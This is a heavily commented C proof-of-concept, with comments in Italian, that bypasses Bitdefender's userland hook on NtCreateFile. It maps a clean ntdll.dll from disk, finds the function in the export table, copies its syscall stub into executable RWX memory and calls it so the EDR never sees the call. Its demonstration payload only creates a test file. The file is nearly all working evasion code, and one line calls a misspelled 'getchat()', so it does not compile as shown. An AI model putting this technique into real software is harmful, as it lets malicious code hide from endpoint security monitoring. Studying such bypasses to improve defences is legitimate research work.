/*
 * Programma di test per dimostrare il bypass dell'hook userland
 * installato da un EDR (nel nostro caso Bitdefender) su NtCreateFile.
 *
 * CONCETTO BASE
 * =============
 * Quando un EDR installa un hook su NtCreateFile in ntdll.dll,
 * modifica i primi byte della funzione IN MEMORIA sovrascrivendoli
 * con un'istruzione JMP verso il proprio codice di analisi.
 *
 * Esempio di NtCreateFile PRIMA dell'hook (versione pulita su disco):
 *
 *   mov r10, rcx        ; istruzione standard NT calling convention
 *   mov eax, 55h        ; carica il syscall number (varia per versione Windows)
 *   syscall             ; transizione da user mode a kernel mode
 *   ret
 *
 * Esempio di NtCreateFile DOPO l'hook (versione in memoria con Bitdefender):
 *
 *   jmp sub_7FFFD1651DA0  ; salta al codice di analisi di Bitdefender
 *   ...                   ; i byte originali sono stati sovrascritti
 *
 * La modifica esiste SOLO in memoria - il file ntdll.dll su disco
 * rimane intatto. Questo e' il punto chiave che questo programma sfrutta:
 * caricando ntdll da disco otteniamo una copia senza hook.
 *
 * ARCHITETTURA DELLA SOLUZIONE
 * ============================
 * 1. Apriamo ntdll.dll direttamente dal filesystem (copia pulita)
 * 2. La mappiamo in memoria come file di dati (non come modulo)
 * 3. Navighiamo la struttura PE per trovare NtCreateFile
 * 4. Copiamo i byte puliti della funzione in memoria eseguibile
 * 5. Chiamiamo quella copia pulita - l'hook non viene attraversato
 *
 * STRUTTURA PE (Portable Executable)
 * ====================================
 * Un file DLL su Windows ha questa organizzazione:
 *
 *   [DOS Header]      - header legacy per compatibilita MS-DOS
 *   [NT Headers]      - header principale con info sul file PE
 *   [Section Headers] - descrizione delle sezioni (.text, .data, ecc)
 *   [Sections]        - contenuto effettivo del file
 *
 * Per trovare una funzione esportata dobbiamo navigare:
 *   NT Headers -> Optional Header -> Data Directory -> Export Directory
 *   Export Directory contiene tre array paralleli:
 *   - AddressOfNames:        nomi delle funzioni esportate
 *   - AddressOfNameOrdinals: indici nell'array delle funzioni
 *   - AddressOfFunctions:    indirizzi (RVA) delle funzioni
 */

#include <stdio.h>
#include <windows.h>
#include <wchar.h>

/*
 * STRUTTURE NECESSARIE PER NtCreateFile
 * ======================================
 * NtCreateFile e' una funzione NT nativa - opera ad un livello
 * piu' basso rispetto alle API Win32 come CreateFileA.
 * Le sue strutture non sono esposte negli header standard di Windows
 * quindi le definiamo manualmente.
 *
 * Queste strutture sono documentate nel Windows Driver Kit (WDK)
 * e in progetti come Process Hacker / phnt.
 */

/*
 * UNICODE_STRING
 * Struttura usata internamente da Windows per rappresentare stringhe.
 * A differenza delle stringhe C che terminano con '\0',
 * UNICODE_STRING usa la lunghezza esplicita in byte.
 * NtCreateFile richiede il path in questo formato.
 */

typedef struct _UNICODE_STRING {
    USHORT Length;          // lunghezza della stringa in byte (senza terminatore)
    USHORT MaximumLength;   // dimensione totale del buffer in byte
    PWSTR  Buffer;          // puntatore alla stringa Unicode (UTF-16)
} UNICODE_STRING, *PUNICODE_STRING;

/*
 * OBJECT_ATTRIBUTES
 * Struttura che descrive un oggetto NT da aprire o creare.
 * NtCreateFile la usa per ricevere il path del file e
 * altri attributi come il directory handle radice.
 */

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;                   // dimensione della struttura
    HANDLE          RootDirectory;            // handle alla directory radice (NULL = path assoluto)
    PUNICODE_STRING ObjectName;              // path del file in formato UNICODE_STRING
    ULONG           Attributes;              // flags (es. OBJ_CASE_INSENSITIVE = 0x40)
    PVOID           SecurityDescriptor;      // descrittore di sicurezza (NULL = default)
    PVOID           SecurityQualityOfService;// qualita' del servizio (NULL = default)
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

/*
 * IO_STATUS_BLOCK
 * Struttura che NtCreateFile usa per restituire informazioni
 * sull'operazione eseguita - in particolare se il file e' stato
 * creato ex novo o aperto perche' esisteva gia'.
 */

typedef struct _IO_STATUS_BLOCK {
    union {
        LONG  Status;   // codice di stato dell'operazione
        PVOID Pointer;  // usato internamente dal kernel
    };
    ULONG_PTR Information; // informazione aggiuntiva (es. FILE_CREATED, FILE_OPENED)
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

/*
 * TIPO PUNTATORE A FUNZIONE PER NtCreateFile
 * ===========================================
 * Definiamo il tipo della funzione in modo da poterla chiamare
 * tramite un puntatore dopo averla estratta dalla copia pulita di ntdll.
 *
 * Parametri principali:
 *   FileHandle        - riceve l'handle al file creato/aperto
 *   DesiredAccess     - tipo di accesso richiesto (lettura, scrittura, ecc)
 *   ObjectAttributes  - path e attributi del file
 *   IoStatusBlock     - riceve il risultato dell'operazione
 *   AllocationSize    - dimensione iniziale del file (NULL = 0)
 *   FileAttributes    - attributi del file (normale, nascosto, ecc)
 *   ShareAccess       - condivisione con altri processi
 *   CreateDisposition - comportamento se il file esiste gia'
 *   CreateOptions     - opzioni aggiuntive di creazione
 *   EaBuffer          - Extended Attributes (NULL = nessuno)
 *   EaLength          - lunghezza Extended Attributes (0)
 *
 * Il tipo di ritorno e' LONG - in NT e' chiamato NTSTATUS.
 * 0x00000000 = STATUS_SUCCESS (operazione riuscita)
 */

typedef LONG (WINAPI *pNtCreateFile)(
    PHANDLE            FileHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK   IoStatusBlock,
    PLARGE_INTEGER     AllocationSize,
    ULONG              FileAttributes,
    ULONG              ShareAccess,
    ULONG              CreateDisposition,
    ULONG              CreateOptions,
    PVOID              EaBuffer,
    ULONG              EaLength
);

/*
 * GetCleanNtCreateFile()
 * ======================
 * Funzione principale del bypass.
 *
 * Carica ntdll.dll direttamente da disco (dove non ci sono hook),
 * trova NtCreateFile nella sua export table, copia i byte puliti
 * in memoria eseguibile e restituisce un puntatore a quella copia.
 *
 * Il chiamante puo' usare quel puntatore per chiamare NtCreateFile
 * senza attraversare l'hook dell'EDR.
 *
 * Ritorna: puntatore alla funzione pulita, oppure NULL in caso di errore.
 */

pNtCreateFile GetCleanNtCreateFile() {

    /*
     * STEP 1 - Apri ntdll.dll dal filesystem
     * ----------------------------------------
     * Usiamo CreateFileA (Win32 API) per aprire il file.
     * Nota: questa chiamata attraversa normalmente l'hook
     * ma e' per aprire ntdll.dll stessa - non e' il file
     * target del nostro test, quindi non interferisce, ma
     * va considerato che questa azione verrà inevitabilmente
     * osservata dall'EDR.
     *
     * Apriamo in sola lettura con FILE_SHARE_READ perche'
     * ntdll e' sempre in uso dal sistema - senza share
     * la chiamata fallirebbe con errore di accesso.
     */

    HANDLE hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ,       // solo lettura
        FILE_SHARE_READ,    // condivisione lettura - necessario perche' ntdll e' sempre in uso
        NULL,               // security attributes default
        OPEN_EXISTING,      // apri solo se esiste (deve sempre esistere)
        0,                  // nessun flag speciale
        NULL                // nessun template
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[ERRORE] Impossibile aprire ntdll.dll da disco: %d\n", GetLastError());
        return NULL;
    }

    printf("[OK] ntdll.dll aperta da disco\n");

    /*
     * STEP 2 - Mappa il file in memoria come dati
     * --------------------------------------------
     * CreateFileMapping crea un oggetto di mapping del file.
     * Usiamo PAGE_READONLY perche' vogliamo solo leggere il contenuto.
     *
     * IMPORTANTE: stiamo mappando il file come DATI, non come
     * modulo eseguibile. Se lo caricassimo con LoadLibrary,
     * Windows applicherebbe automaticamente le relocations e
     * i loader hook e l'EDR potrebbe hookare anche questa copia.
     */

    HANDLE hMapping = CreateFileMappingA(
        hFile,
        NULL,           // security attributes default
        PAGE_READONLY,  // sola lettura
        0,              // dimensione massima - 0 = usa dimensione del file
        0,              // dimensione massima parte bassa
        NULL            // nessun nome per il mapping
    );

    if (!hMapping) {
        printf("[ERRORE] CreateFileMapping fallita: %d\n", GetLastError());
        CloseHandle(hFile);
        return NULL;
    }

    /*
     * STEP 3 - Ottieni il puntatore alla memoria mappata
     * ---------------------------------------------------
     * MapViewOfFile rende accessibile il contenuto del file
     * come se fosse un array di byte in memoria.
     * pMappedDll punta all'inizio del file - al DOS header.
     */

    LPVOID pMappedDll = MapViewOfFile(
        hMapping,
        FILE_MAP_READ,  // accesso in sola lettura
        0,              // offset alto - 0 = inizio del file
        0,              // offset basso - 0 = inizio del file
        0               // dimensione - 0 = mappa tutto il file
    );

    if (!pMappedDll) {
        printf("[ERRORE] MapViewOfFile fallita: %d\n", GetLastError());
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return NULL;
    }

    printf("[OK] ntdll.dll mappata in memoria come file di dati\n");

    /*
     * STEP 4 - Naviga la struttura PE per trovare NtCreateFile
     * ---------------------------------------------------------
     * Un file PE (DLL o EXE) ha una struttura gerarchica:
     *
     *   pMappedDll -> IMAGE_DOS_HEADER
     *                     |
     *                     e_lfanew (offset)
     *                     |
     *                     v
     *                 IMAGE_NT_HEADERS
     *                     |
     *                     OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
     *                     |
     *                     VirtualAddress (RVA)
     *                     |
     *                     v
     *                 IMAGE_EXPORT_DIRECTORY
     *                     |
     *                     +--> AddressOfNames[]        nomi funzioni
     *                     +--> AddressOfNameOrdinals[] indici
     *                     +--> AddressOfFunctions[]    indirizzi (RVA)
     *
     * RVA = Relative Virtual Address = offset dall'inizio del file/modulo
     * Per convertire un RVA in puntatore: (BYTE*)base + RVA
     */

    // DOS header - il primo header del file PE
    // e_lfanew contiene l'offset al NT header
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pMappedDll;

    // NT header - contiene le informazioni principali del PE
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(
        (BYTE*)pMappedDll + dosHeader->e_lfanew
    );

    // Export directory - contiene la lista delle funzioni esportate
    // IMAGE_DIRECTORY_ENTRY_EXPORT = 0, e' la prima data directory
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)(
        (BYTE*)pMappedDll +
        ntHeaders->OptionalHeader
            .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
            .VirtualAddress
    );

    // I tre array paralleli della export table
    // Per trovare una funzione per nome:
    //   1. cerca il nome in names[i]
    //   2. usa ords[i] come indice in funcs[]
    //   3. funcs[ords[i]] e' l'RVA della funzione
    DWORD* names = (DWORD*)((BYTE*)pMappedDll + exportDir->AddressOfNames);
    WORD*  ords  = (WORD*) ((BYTE*)pMappedDll + exportDir->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)pMappedDll + exportDir->AddressOfFunctions);

    /*
     * STEP 5 - Cerca NtCreateFile per nome nella export table
     * --------------------------------------------------------
     * Iteriamo su tutti i nomi esportati da ntdll finche'
     * non troviamo "NtCreateFile".
     */
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {

        // Ogni elemento di names[] e' un RVA che punta al nome della funzione
        const char* name = (const char*)((BYTE*)pMappedDll + names[i]);

        if (strcmp(name, "NtCreateFile") == 0) {

            printf("[OK] NtCreateFile trovata nella export table\n");

            /*
             * STEP 6 - Calcola l'indirizzo della funzione nella copia mappata
             * -----------------------------------------------------------------
             * funcs[ords[i]] e' l'RVA della funzione - un offset dall'inizio
             * del modulo. Sommandolo alla base della copia mappata otteniamo
             * il puntatore ai byte della funzione nel file su disco.
             *
             * Questi byte sono:
             *   4C 8B D1       mov r10, rcx
             *   B8 55 00 00 00 mov eax, 55h   <- syscall number
             *   0F 05          syscall
             *   C3             ret
             *
             * Senza il JMP di Bitdefender che esiste solo in memoria.
             */
            DWORD funcRVA   = funcs[ords[i]];
            BYTE* funcBytes = (BYTE*)pMappedDll + funcRVA;

            /*
             * STEP 7 - Alloca memoria eseguibile e copia i byte puliti
             * ----------------------------------------------------------
             * I byte della funzione nella copia mappata sono in memoria
             * con permessi di sola lettura - non possiamo eseguirli direttamente.
             * Dobbiamo copiarli in una nuova regione di memoria con permessi
             * di esecuzione (PAGE_EXECUTE_READWRITE).
             *
             * 128 byte sono piu' che sufficienti per contenere NtCreateFile
             * che e' una funzione molto corta (circa 20 byte).
             *
             * PAGE_EXECUTE_READWRITE = memoria leggibile, scrivibile ed eseguibile
             * Nota: questo flag e' sospetto per un EDR - in un contesto reale
             * si userebbe prima PAGE_READWRITE per scrivere, poi si cambierebbe
             * a PAGE_EXECUTE_READ con VirtualProtect. Per semplicita' del test
             * usiamo PAGE_EXECUTE_READWRITE direttamente.
             */

            BYTE* cleanFunc = (BYTE*)VirtualAlloc(
                NULL,                       // indirizzo scelto dal sistema
                128,                        // dimensione in byte
                MEM_COMMIT | MEM_RESERVE,   // alloca e committa subito
                PAGE_EXECUTE_READWRITE      // permessi lettura + scrittura + esecuzione
            );

            if (!cleanFunc) {
                printf("[ERRORE] VirtualAlloc fallita: %d\n", GetLastError());
                break;
            }

            // Copia i byte puliti dalla versione su disco
            // nella memoria eseguibile appena allocata
            memcpy(cleanFunc, funcBytes, 128);

            printf("[OK] Byte puliti di NtCreateFile copiati in memoria eseguibile\n");

            // Mostra gli indirizzi per confronto in IDA
            // L'indirizzo hookato e' quello in ntdll gia' caricata in memoria
            // L'indirizzo pulito e' quello della nostra copia appena creata
            printf("\n[INFO] Indirizzo NtCreateFile HOOKATO  (in memoria): %p\n",
                GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateFile")
            );
            printf("[INFO] Indirizzo NtCreateFile PULITA   (da disco):   %p\n\n",
                cleanFunc
            );

            // Cleanup delle risorse di mapping - non servono piu'
            // abbiamo gia' copiato i byte che ci interessavano
            UnmapViewOfFile(pMappedDll);
            CloseHandle(hMapping);
            CloseHandle(hFile);

            // Restituisce il puntatore alla funzione pulita
            return (pNtCreateFile)cleanFunc;
        }
    }

    // NtCreateFile non trovata - non dovrebbe mai succedere
    printf("[ERRORE] NtCreateFile non trovata nella export table\n");
    UnmapViewOfFile(pMappedDll);
    CloseHandle(hMapping);
    CloseHandle(hFile);
    return NULL;
}


int main() {

    printf("=================================================\n");
    printf(" Test bypass hook EDR tramite ntdll pulita\n");
    printf(" Tecnica: caricamento ntdll da disco\n");
    printf("=================================================\n\n");

    /*
     * FASE 1 - Ottieni il puntatore a NtCreateFile pulita
     * -----------------------------------------------------
     * Questa chiamata carica ntdll da disco, naviga la PE,
     * copia i byte puliti in memoria eseguibile e restituisce
     * il puntatore. L'hook di Bitdefender non viene attraversato
     * in nessun punto di questa operazione.
     */

    printf("[*] Caricamento NtCreateFile pulita da disco...\n");
    pNtCreateFile CleanNtCreateFile = GetCleanNtCreateFile();

    if (!CleanNtCreateFile) {
        printf("[ERRORE FATALE] Impossibile ottenere NtCreateFile pulita\n");
        return 1;
    }

    /*
     * FASE 2 - Prepara i parametri per NtCreateFile
     * -----------------------------------------------
     * NtCreateFile richiede il path in formato NT, diverso dal
     * formato Win32 usato da CreateFileA.
     *
     * Formato Win32: C:\Users\Public\test.txt
     * Formato NT:    \??\C:\Users\Public\test.txt
     *
     * Il prefisso \??\ e' il device namespace di Windows.
     * NtCreateFile opera a un livello piu' basso rispetto
     * alle API Win32 e richiede questo formato esplicito.
     */

    UNICODE_STRING filePath;
    WCHAR ntPath[] = L"\\??\\C:\\Users\\Public\\test_clean_ntdll.txt";
    filePath.Buffer        = ntPath;
    filePath.Length        = (USHORT)(wcslen(ntPath) * sizeof(WCHAR));
    filePath.MaximumLength = filePath.Length + sizeof(WCHAR); // spazio per il terminatore

    /*
     * OBJECT_ATTRIBUTES descrive il file da creare.
     * RootDirectory = NULL significa che il path e' assoluto.
     * Attributes = 0x40 = OBJ_CASE_INSENSITIVE (case insensitive come Win32).
     */

    OBJECT_ATTRIBUTES objAttr;
    objAttr.Length                   = sizeof(OBJECT_ATTRIBUTES);
    objAttr.RootDirectory            = NULL;
    objAttr.ObjectName               = &filePath;
    objAttr.Attributes               = 0x40; // OBJ_CASE_INSENSITIVE
    objAttr.SecurityDescriptor       = NULL;
    objAttr.SecurityQualityOfService = NULL;

    // IO_STATUS_BLOCK ricevera' il risultato dell'operazione
    IO_STATUS_BLOCK iosb = {0};
    HANDLE hFile = NULL;

    /*
     * FASE 3 - Chiama NtCreateFile dalla versione PULITA
     * ----------------------------------------------------
     * Questa e' la chiamata chiave del test.
     *
     * Stiamo chiamando i byte puliti copiati da disco -
     * non la funzione in ntdll in memoria che ha il JMP
     * di Bitdefender come prima istruzione.
     *
     * Il codice eseguito sara':
     *   mov r10, rcx        <- calling convention NT
     *   mov eax, 55h        <- syscall number di NtCreateFile
     *   syscall             <- transizione diretta al kernel
     *   ret
     *
     * L'hook di Bitdefender (jmp sub_7FFFD1651DA0) non viene
     * mai attraversato - Bitdefender non sa che questa
     * chiamata e' avvenuta.
     *
     * Parametri:
     *   GENERIC_WRITE | SYNCHRONIZE = accesso scrittura + attesa completamento
     *   FILE_ATTRIBUTE_NORMAL       = file normale senza attributi speciali
     *   ShareAccess = 0             = nessuna condivisione
     *   CreateDisposition = 2       = FILE_OVERWRITE_IF (crea o sovrascrivi)
     *   CreateOptions = 0x20        = FILE_SYNCHRONOUS_IO_NONALERT (I/O sincrono)
     */

    printf("[*] Chiamata NtCreateFile tramite versione pulita da disco...\n");
    printf("[*] L'hook di Bitdefender NON verra' attraversato\n\n");
    getchat(); // pausa per consentire il debug

    LONG status = CleanNtCreateFile(
        &hFile,                         // riceve l'handle al file
        GENERIC_WRITE | SYNCHRONIZE,    // accesso richiesto
        &objAttr,                       // path e attributi
        &iosb,                          // riceve il risultato
        NULL,                           // dimensione iniziale - NULL = 0
        FILE_ATTRIBUTE_NORMAL,          // attributi del file
        0,                              // nessuna condivisione
        2,                              // FILE_OVERWRITE_IF
        0x20,                           // FILE_SYNCHRONOUS_IO_NONALERT
        NULL,                           // nessun Extended Attribute
        0                               // lunghezza EA = 0
    );

    /*
     * FASE 4 - Verifica il risultato
     * --------------------------------
     * NTSTATUS 0x00000000 = STATUS_SUCCESS
     * Qualsiasi altro valore indica un errore.
     */
    
    if (status == 0) {
        printf("[SUCCESSO] File creato: C:\\Users\\Public\\test_clean_ntdll.txt\n");
        printf("\n[VERIFICA IN IDA]\n");
        printf("  Metti un breakpoint su: sub_7FFFD1651DA0\n");
        printf("  (l'indirizzo della trampoline di Bitdefender)\n");
        printf("  Il breakpoint NON deve scattare durante questa esecuzione\n");
        printf("  perche' l'hook non e' stato attraversato\n");
        CloseHandle(hFile);
    } else {
        printf("[ERRORE] NtCreateFile ha restituito: 0x%X\n", status);
        printf("  Possibile causa: permessi insufficienti o path non valido\n");
    }

    printf("\nPremi invio per terminare...\n");
    getchar();
    return 0;
}